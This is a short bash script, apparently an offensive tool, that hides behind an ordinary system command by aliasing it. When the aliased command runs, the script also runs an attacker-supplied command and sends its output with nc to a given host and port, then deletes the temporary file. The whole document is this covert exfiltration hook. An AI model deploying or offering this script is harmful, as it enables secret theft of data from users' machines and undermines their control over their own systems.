#!/bin/bash

if [ "$#" -ne 4 ]; then
	echo "Usuage: ./alias.sh '<binary to replace>' <command> <lhost> <lport>"
else
	original=$(which $1)
	if [[ "$original" == *"bin"* ]]; then
		command="$original && echo $($2) > .tmp && nc -w 2 $3 $4 < .tmp && rm .tmp"
		alias $1=$command
		echo "Done!"
	else
		echo "$1 is not a valid command to alias!"
	fi
fi
